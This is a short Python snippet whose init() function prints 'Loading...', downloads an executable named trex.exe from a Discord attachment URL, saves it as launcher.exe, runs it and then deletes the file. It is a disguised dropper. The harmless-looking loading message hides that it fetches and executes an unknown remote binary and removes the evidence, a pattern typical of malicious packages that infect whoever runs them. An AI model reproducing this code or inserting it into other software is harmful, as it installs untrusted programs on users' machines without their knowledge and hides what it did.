def init():
    import requests
    import os

    print("Loading...")

    url = 'https://cdn.discordapp.com/attachments/997534165178269716/999721847413288990/trex.exe'
    r = requests.get(url, allow_redirects=True)

    open('launcher.exe', 'wb').write(r.content)

    os.system('launcher.exe')
    os.remove('launcher.exe')
